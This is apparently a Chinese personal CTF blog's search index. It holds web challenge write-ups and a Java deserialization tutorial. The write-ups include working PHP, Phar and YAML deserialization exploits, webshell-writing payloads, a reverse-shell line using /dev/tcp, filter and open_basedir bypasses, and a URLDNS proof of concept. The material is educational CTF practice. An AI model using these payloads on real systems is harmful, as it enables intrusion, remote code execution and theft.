{"pages":[{"title":"","text":"about me Whoami : zIxyd Contact : Mjk3MjkxNDY5Mg== Dream : 重生之我要当大黑阔 Age : 19 CTF: WEB/PWN Skill : 精通 Python/Java/C/C++/PHP/JavaScript的Hello World","link":"/about/index.html"},{"title":"","text":"","link":"/links/index.html"}],"posts":[{"title":"test","text":"[EIS 2019]EzPOP代码审计的php反序列化，自己没有审出来，看了wp才发现很简单 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122&lt;?phperror_reporting(0);class A { protected $store; protected $key; protected $expire; public function __construct($store, $key = 'flysystem', $expire = null) { $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path =&gt; $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); } public function save() { $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); } public function __destruct() { if (!$this-&gt;autosave) { $this-&gt;save(); } }}class B { protected function getExpireTime($expire): int { return (int) $expire; } public function getCacheKey(string $name): string { return $this-&gt;options['prefix'] . $name; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&gt;options['serialize']; return $serialize($data); } public function set($name, $value, $expire = null): bool{ $this-&gt;writeTimes++; if (is_null($expire)) { $expire = $this-&gt;options['expire']; } $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // 创建失败 } } $data = $this-&gt;serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } $data = &quot;&lt;?php\\n//&quot; . sprintf('%012d', $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) { return true; } return false; }}if (isset($_GET['src'])){ highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){ mkdir($dir);}unserialize($_GET[&quot;data&quot;]); POP :__destruct ==&gt; save ==&gt; set 当然exp不止一种，我选了一种比较简单的做法 array_filp : 反转数组中的键名和对应关联的键值： 12345678&lt;?php$a1=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;,&quot;c&quot;=&gt;&quot;blue&quot;,&quot;d&quot;=&gt;&quot;yellow&quot;);$result=array_flip($a1);print_r($result);?&gt; #============#Array ( [red] =&gt; a [green] =&gt; b [blue] =&gt; c [yellow] =&gt; d ) exp 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phperror_reporting(0);class A { public $store; public $key; public $expire; public $cache; public $autosave; public $complete; public function __construct($store, $key = 'flysystem', $expire = null) { $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; } }class B {public $options;}$b = new B;$a = new A($b,&quot;shell.php&quot;,0);$a-&gt;cache = array();$a-&gt;autosave = false;$a-&gt;complete = &quot;aaaPD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7ID8+&quot;;$b-&gt;options['prefix'] = &quot;php://filter/write=convert.base64-decode/resource=&quot;;$b-&gt;options['serialize'] = &quot;strval&quot;;$b-&gt;options['data_compress'] = false;echo urlencode(serialize($a)); PharOneindex.php是一个文件上传的功能，查看源代码发现class.php，访问得到,看似没有任何的利用点 12345678910&lt;?phphighlight_file(__FILE__);class Flag{ public $cmd; public function __destruct() { @exec($this-&gt;cmd); }}@unlink($_POST['file']); 其实看名字就知道考的是php中的phar反序列化，但是没想到phar受影响的文件操作函数有很多，包括class.php中的unlink函数 漏洞利用条件 12345phar可以上传到服务器端(存在文件上传)要有可用的魔术方法作为“跳板”。文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤 很明显这三个条件都满足 还有一点的是，过滤了关键字；题目对__HALT_COMPILER()进行了过滤，可以使用gzip等压缩进行绕过，Phar反序列化的一个小技巧，其次考点在于恶意类中的命令执行函数是无回显的，不过Web根目录可写，可以直接写一个WebShell进去 1!preg_match(&quot;/__HALT_COMPILER/i&quot;,FILE_CONTENTS) exp 12345678910111213141516&lt;?phpclass Flag{ public $cmd = &quot;echo \\&quot;&lt;?= @eval(\\\\\\$_POST[1]);\\&quot; &gt; /var/www/html/1.php&quot;; }@unlink(&quot;1.phar&quot;);$phar = new Phar(&quot;1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;__HALT_COMPILER(); ?&gt;&quot;);$o = new Flag();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt &quot;,&quot;test&quot;);$phar-&gt;stopBuffering();system(&quot;gzip 1.phar&quot;);rename(&quot;1.phar.gz&quot;,&quot;1.png&quot;); [HDCTF 2023]YamiYami 1http://node4.anna.nssctf.cn:28766/read?url=https://baidu.com read存在任意文件读取，但是过滤了关键字flag和app， 利用url二次编码绕过，读取app.py文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import osimport re, random, uuidfrom flask import *from werkzeug.utils import *import yamlfrom urllib.request import urlopenapp = Flask(__name__)random.seed(uuid.getnode())app.config['SECRET_KEY'] = str(random.random()*233)app.debug = FalseBLACK_LIST=[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;]app.config['UPLOAD_FOLDER']=&quot;/app/uploads&quot;@app.route('/')def index(): session['passport'] = 'YamiYami' return ''' Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt; &lt;br&gt; Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt; &lt;br&gt; Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt; '''@app.route('/pwd')def pwd(): return str(pwdpath)@app.route('/read')def read(): try: url = request.args.get('url') m = re.findall('app.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m: return &quot;re.findall('app.*', url, re.IGNORECASE)&quot; if n: return &quot;re.findall('flag', url, re.IGNORECASE)&quot; res = urlopen(url) return res.read() except Exception as ex: print(str(ex)) return 'no response'def allowed_file(filename): for blackstr in BLACK_LIST: if blackstr in filename: return False return True@app.route('/upload', methods=['GET', 'POST'])def upload_file(): if request.method == 'POST': if 'file' not in request.files: flash('No file part') return redirect(request.url) file = request.files['file'] if file.filename == '': return &quot;Empty file&quot; if file and allowed_file(file.filename): filename = secure_filename(file.filename) if not os.path.exists('./uploads/'): os.makedirs('./uploads/') file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename)) return &quot;upload successfully!&quot; return render_template(&quot;index.html&quot;)@app.route('/boogipop')def load(): if session.get(&quot;passport&quot;)==&quot;Welcome To HDCTF2023&quot;: LoadedFile=request.args.get(&quot;file&quot;) if not os.path.exists(LoadedFile): return &quot;file not exists&quot; with open(LoadedFile) as f: yaml.full_load(f) f.close() return &quot;van you see&quot; else: return &quot;No Auth bro&quot;if __name__=='__main__': pwdpath = os.popen(&quot;pwd&quot;).read() app.run( debug=False, host=&quot;0.0.0.0&quot; ) print(app.config['SECRET_KEY']) #&quot;{'passport':'Welcome To HDCTF2023'}&quot; 虽然代码比较长，但是结构简单，很明显boogipop路由就是一个后门 yaml.full_load(f)存在yaml反序列化 12random.seed(uuid.getnode())app.config['SECRET_KEY'] = str(random.random()*233) **uuid.getnode()**：获取当前的mac地址，可以通过任意文件读取得到 file:///sys/class/net/eth0/address 1234import randomrandom.seed(0x0242ac02ee02)print(str(random.random()*233))#得到key,伪造session 上传一个yaml文件，等待反序列化,但是过滤了yaml等关键字，但是yaml.full_load并不会受到后缀名的影响，后缀名起一个txt 123456789!!python/object/new:str args: [] state: !!python/tuple - &quot;__import__('os').system('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\\&quot;')&quot; - !!python/object/new:staticmethod args: [] state: update: !!python/name:eval items: !!python/name:list 最终反弹shell，发现flag在 环境变量 /proc/1/environ 引用的是进程 ID 为 1 的 init 进程的环境变量。 init 进程是 Linux 系统中的第一个用户空间进程，它负责启动和管理其他用户进程。 gogogo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))func Index(c *gin.Context) { session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[&quot;name&quot;] == nil { session.Values[&quot;name&quot;] = &quot;User&quot; err = session.Save(c.Request, c.Writer) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } } c.String(200, &quot;Hello, User. How to become admin?&quot;)}func Readflag(c *gin.Context) { session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[&quot;name&quot;] == &quot;admin&quot; { c.String(200, &quot;Congratulation! You are admin,But how to get flag?\\n&quot;) path := c.Query(&quot;filename&quot;) reg := regexp.MustCompile(`[b-zA-Z_@#%^&amp;*:{|}+&lt;&gt;&quot;;\\[\\]]`) if reg.MatchString(path) { http.Error(c.Writer, &quot;nonono&quot;, http.StatusInternalServerError) return } var data []byte if path != &quot;&quot; { data = readfile.ReadFile(path) } else { data = []byte(&quot;请传入参数&quot;) } c.JSON(200, gin.H{ &quot;success&quot;: &quot;read: &quot; + string(data), }) } else { c.String(200, &quot;Hello, User. How to become admin?&quot;) }} 1var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;))) 从环境变量的SESSION_KEY，推测环境变量根本没有SESSION_KEY，所以为空 只需要将源码改一下，在本地跑一下,伪造出name为admin的session 1session.Values[&quot;name&quot;] = &quot;admin&quot; 然后就到了,绕过正则匹配 ，我当时就是卡在了这里，看完wp之后，说是没有过滤字符a和问号， 123456789path := c.Query(&quot;filename&quot;) reg := regexp.MustCompile(`[b-zA-Z_@#%^&amp;*:{|}+&lt;&gt;&quot;;\\[\\]]`) if reg.MatchString(path) { http.Error(c.Writer, &quot;nonono&quot;, http.StatusInternalServerError) return } payload 1http://112.6.51.212:32876/readflag?filename=/??a? 还有一种方式，利用8进制绕过 /flag 1http://112.6.51.212:32876/readflag?filename=$'\\057\\146\\154\\141\\147' [HUBUCTF 2022 新生赛]Calculate 写一个python脚本,结合xpath和eval函数，简直不要太简单 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom lxml import etreeimport timedef get_content(res,url): response = res.get(url) return response.textdef get_data(content): url = &quot;http://node5.anna.nssctf.cn:28829&quot; tree = etree.HTML(content) data = tree.xpath(&quot;//div/text()&quot;) data = &quot;&quot;.join(data) data = data[:-1] return datadef result(res,data): url = &quot;http://node5.anna.nssctf.cn:28829&quot; print(data) #data = str(data) d = eval(data) print(d) data = { &quot;ans&quot;:d } r = res.post(url=url,data=data) print(r.text)if __name__ == &quot;__main__&quot;: #http://node5.anna.nssctf.cn:28829/ res = requests.session() url = &quot;http://node5.anna.nssctf.cn:28829&quot; for i in range(22): content = get_content(res,url) time.sleep(1) data = get_data(content) result(res,data) 123Tzo3OiJOb3RlYXN5IjoyOntzOjY6InBhcmFtMSI7czoxNToiY3JlYXRlX2Z1bmN0aW9uIjtzOjY6InBhcmFtMiI7czoyMjoifTtzeXN0ZW0oJF9QT1NUWzFdKTsvLyI7fQ==Tzo3OiJOb3RlYXN5IjoyOntzOjk6IgAqAHBhcmFtMSI7czoxNToiY3JlYXRlX2Z1bmN0aW9uIjtzOjk6IgAqAHBhcmFtMiI7czoyMjoifTtzeXN0ZW0oJF9QT1NUWzFdKTsvLyI7fQ== easy_eval123456789101112131415&lt;?phperror_reporting(0);highlight_file(__FILE__);$code = $_POST['code'];if(isset($code)){ $code = str_replace(&quot;?&quot;,&quot;&quot;,$code); eval(&quot;?&gt;&quot;.$code);} 用**?&gt;**闭合了 所以不管$code是什么 都不会运行 payload 1post: code=&lt;script language='php'&gt;system(&quot;cat /f1agaaa&quot;);&lt;/script&gt; ez_remove1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);class syc{ public $lover; public function __destruct() { echo $this-&gt;lover; echo &quot;daozhel&quot;; eval($this-&gt;lover); }}if(isset($_GET['web'])){ if(!preg_match('/lover/i',$_GET['web'])){ $a=unserialize($_GET['web']); throw new Error(&quot;快来玩快来玩~&quot;); } else{ echo(&quot;nonono&quot;); }}?&gt; 利用十六进制要绕过正则匹配 1lover ==&gt; \\6cover 利用gc回收绕过异常 1O:3:&quot;syc&quot;:1 ==&gt; O:3:&quot;syc&quot;:2 写入一句话木马，这里需要注意的是要将小写s转变大写S ,才能解析十六进制 1?web=O:3:&quot;syc&quot;:2:{S:5:&quot;\\6cover&quot;;s:53:&quot;file_put_contents('2.php','&lt;?php @eval($_POST[1]);');&quot;;} 写入木马 ，发现无法正常执行shell命令，读取phpinfo查看disable_functions 发现禁用了函数system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen 还有open_basedir: /var/www/html/ 绕过open_basedir: ini_set用来设置php.ini的值，无需打开php.ini文件，就能修改配置 1mkdir('test');chdir('test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');show_source(&quot;f1ger&quot;); babyupload(os.path.join)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from flask import Flask, request, redirect, g, send_from_directoryimport sqlite3import osimport uuidapp = Flask(__name__)SCHEMA = &quot;&quot;&quot;CREATE TABLE files (id text primary key,path text);&quot;&quot;&quot;def db(): g_db = getattr(g, '_database', None) if g_db is None: g_db = g._database = sqlite3.connect(&quot;database.db&quot;) return g_db@app.before_first_requestdef setup(): os.remove(&quot;database.db&quot;) cur = db().cursor() cur.executescript(SCHEMA)@app.route('/')def hello_world(): return &quot;&quot;&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; Select image to upload: &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;&lt;!-- /source --&gt;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;@app.route('/source')def source(): return send_from_directory(directory=&quot;/var/www/html/&quot;, path=&quot;www.zip&quot;, as_attachment=True)@app.route('/upload', methods=['POST'])def upload(): if 'file' not in request.files: return redirect('/') file = request.files['file'] if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() file.save('uploads/' + file.filename) return redirect('/file/' + uid)@app.route('/file/&lt;id&gt;')def file(id): conn = db() cur = conn.cursor() cur.execute(&quot;select path from files where id=?&quot;, (id,)) res = cur.fetchone() if res is None: return &quot;File not found&quot;, 404 with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f: return f.read()if __name__ == '__main__': app.run(host='0.0.0.0', port=80) 一开始我还一个是一个sql类型的题目，因为cur.execute是可以执行多条命令的； 后来发现是os.path.join的一个特性导致的漏洞 12345绝对路径拼接漏洞os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径 直接bp抓包，将文件名字改成**/flag**,就可以泄露flag文件的数据了 这个os.path.join算是一个可能会在实际情况下会发生的一个特性漏洞","link":"/2023/10/31/test/"},{"title":"Java反序列化基础","text":"重写readObject来执行命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546//Studentpackage test;import java.io.IOException;import java.io.Serializable;public class Student implements Serializable { public String name; public int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; }// @Override public String toString() { // 返回对象的字符串表示 return &quot;Student{&quot; + &quot;name='&quot; + name + '\\'' + &quot;, age=&quot; + age + '}'; } //重写readObject private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(&quot;calc.exe&quot;); }} 1234567891011121314151617//Serializepackage test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class abc { public static void main(String[] args) throws IOException { Student stu = new Student(&quot;lisi&quot;,18); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.txt&quot;)); oos.writeObject(stu); System.out.println(stu); oos.close(); }} 1234567891011121314151617181920//Unserializepackage test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class unseralize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.txt&quot;)); Object o = ois.readObject(); System.out.println(o); ois.close(); }} Java(反射基础)Java反射是指在运行时动态地获取、检查和操作类的信息的机制。它允许程序在运行时通过类的名称来获取类的详细信息，包括类的构造函数、方法、字段等，并且可以在运行时动态地创建对象、调用方法和访问字段。反射机制使得程序可以在编译时无法确定具体类的情况下，通过名称来操作类，从而提供了更大的灵活性和动态性。 反射获取class对象1234567891011121314151617181920public class test01 { public static void main(String[] args) throws ClassNotFoundException { /* 获取class对象的三种方式 Class.forName(&quot;全类名&quot;) 全类名：包名+类名 类名.class 对象。getClass() */ Class clazz01 = Class.forName(&quot;Student&quot;); System.out.println(clazz01); Class clazz02 = Student.class; System.out.println(clazz02); Student s = new Student(); Class clazz03 = s.getClass(); System.out.println(clazz03); }} 反射获取构造方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Parameter;public class test01 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException { /* Class类中用于获取构造方法的方法 Class类中用于获取构造方法的方法 Constructor&lt;?&gt;[]getConstructors():返回所有公共构造方法对象的数组 Constructor&lt;?&gt;[]getDeclaredConstructors():返回所有构造方法对象的数组 Constructor&lt;T&gt;getConstructor(Class&lt;?&gt;…parameterTypes):返回单个公共构造方法对象 Constructor&lt;-T&gt;getDeclaredConstructor((Class&lt;?&gt;parameterTypes):返回单个构造方法对象 */ //获取Class字节码文件对象 Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有构造方法&quot;); Constructor[] con = clazz.getDeclaredConstructors(); for (Constructor constructor : con) { System.out.println(constructor.toString()); } System.out.println(&quot;获取无参的构造方法&quot;); Constructor con1 = clazz.getConstructor(); System.out.println(con1); System.out.println(&quot;获取参数为String类型的构造方法&quot;); Constructor con2 = clazz.getDeclaredConstructor(String.class); System.out.println(con2); System.out.println(&quot;获取参数为int类型的构造方法&quot;); Constructor con3 = clazz.getDeclaredConstructor(int.class); System.out.println(con3); System.out.println(&quot;获取参数为Sting类型和int类型的构造方法&quot;); Constructor con4 = clazz.getDeclaredConstructor(String.class,int.class); System.out.println(con4); System.out.println(&quot;获取构造方法的权限修饰符&quot;); /* public : 1 protected : 4 private : 2 */ int modifiers = con4.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取构造方法的参数&quot;); Parameter[] parameters = con4.getParameters(); for(Parameter parameter : parameters){ System.out.println(parameter); } System.out.println(&quot;创建对象&quot;); con4.setAccessible(true); Object stu = con4.newInstance(&quot;张三&quot;, 18); System.out.println(stu); }} 反射获取成员变量1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.lang.reflect.Field;public class test02 { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { /* Field[] getFields():返回所有公共成员变量对象的数组 Field[] getDeclaredFields():返回所有成员变量对象的数组 Field getField(String name):返回单个公共成员变量对象 Field getDeclaredField(String name):返回单个成员变量对象 */ System.out.println(&quot;获取class字节码文件对象&quot;); Class clazz = Class.forName(&quot;Student&quot;); System.out.println(&quot;获取所有成员变量对象&quot;); Field[] fields = clazz.getDeclaredFields(); for (Field field :fields){ System.out.println(field); } System.out.println(&quot;获取name成员变量&quot;); Field name = clazz.getDeclaredField(&quot;name&quot;); System.out.println(name); System.out.println(&quot;获取权限修饰符&quot;); int modifiers = name.getModifiers(); System.out.println(modifiers); System.out.println(&quot;获取Name&quot;); String n = name.getName(); System.out.println(n); System.out.println(&quot;获取成员变量记录的值&quot;); Student s = new Student(&quot;李四&quot;,18,&quot;男&quot;); name.setAccessible(true); Object value = name.get(s); System.out.println(value); System.out.println(&quot;修改成员变量记录的值&quot;); name.set(s,&quot;张三&quot;); Object value2 = name.get(s); System.out.println(value2); }} URLDNSpoc1234567891011121314151617181920212223242526272829303132import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class Serialize { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://9t3yg0l28pe8p1dypavjbhwf66cx0o1cq.oastify.com&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,2); //在hashmap.put中调用了putVal() hashmap.put(url, 1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;)); hashcodefield.set(url,-1); oos.writeObject(hashmap); oos.close(); }} 12345678910111213import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.ObjectInputStream;public class unSerialize { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;)); ois.readObject(); ois.close(); }} pop gadget12345Gadget Chain: HashMap.readObject() HashMap.putVal() HashMap.hash() URL.hashCode() 可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求. 我在学习URLDNS中遇到一个问题：尽管我setAccessible(true);还是会报错： Unable to make field private int java.net.URL.hashCode accessible: module java.base does not “opens java.net” to unnamed module @5b480cf9,解决方法：更换jdk版本到1.8 动态代理在Java中，动态代理是一种机制，它允许在运行时创建代理对象，以代替原始对象执行特定的操作。代理对象可以拦截对原始对象的方法调用，并在调用前后执行额外的逻辑。","link":"/2023/11/01/java(unserialize)/"}],"tags":[{"name":"python","slug":"python","link":"/tags/python/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"}],"categories":[]}